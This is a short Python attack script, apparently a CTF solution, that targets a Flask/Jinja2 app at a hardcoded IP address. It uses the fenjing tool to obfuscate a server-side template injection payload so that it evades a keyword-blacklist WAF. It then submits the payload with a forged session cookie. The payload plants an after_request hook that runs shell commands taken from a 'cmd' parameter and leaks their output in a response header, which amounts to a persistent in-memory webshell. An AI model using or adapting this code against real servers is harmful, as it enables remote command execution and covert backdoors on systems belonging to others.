import fenjing
import logging

import requests

logging.basicConfig(level=logging.INFO)

payload = """
[
    app.view_functions
    for app in [ __import__('sys').modules["__main__"].app ]
    for c4tchm3 in [
        lambda resp: [
            resp
            for cmd_result in [__import__('os').popen(__import__('__main__').app.jinja_env.globals["request"].args.get("cmd", "id")).read()]
            if [
                resp.headers.__setitem__("Aaa", __import__("base64").b64encode(cmd_result.encode()).decode()),
                print(resp.headers["Aaa"])
            ]
        ][0]
    ]
    if [
        app.__dict__.update({'_got_first_request':False}),
        app.after_request_funcs.setdefault(None, []).append(c4tchm3)
    ]
]
"""


def waf(s):
    blacklist = [
        "\\", "{%", "config", "session", "request", "self", "url_for",
        "current_app", "get_flashed_messages", "lipsum", "cycler", "joiner",
        "namespace", "chr", "request.", "|", "%c", "eval", "[", "]", "exec",
        "pop(", "get(", "setdefault", "getattr", ":", "os", "app"
    ]
    return all(word not in s for word in blacklist)


full_payload_gen = fenjing.FullPayloadGen(waf)
payload, will_print = full_payload_gen.generate(
    fenjing.const.EVAL, (fenjing.const.STRING, payload))
if not will_print:
    print("这个payload不会产生回显")
print(payload)

r = requests.post(
    "http://1.95.87.193:36183/admin",
    data={"code": payload},
    cookies={
        "Token":
        "eyJuYW1lIjogImFhYSIsICJzZWNyZXQiOiAiZXlKaGJHY2lPaUpJVXpJMU5pSXNJblI1Y0NJNklrcFhWQ0o5LmV5SnVZVzFsSWpvaVlXRmhJaXdpYVhOZllXUnRhVzRpT2lJeEluMC43RlZYSHppMEZvY2NMRmFJdWlOMUx3S0p4WmdJT3RTRTEweGxFOTBBa3FNIn0="
    })
print(r.text)
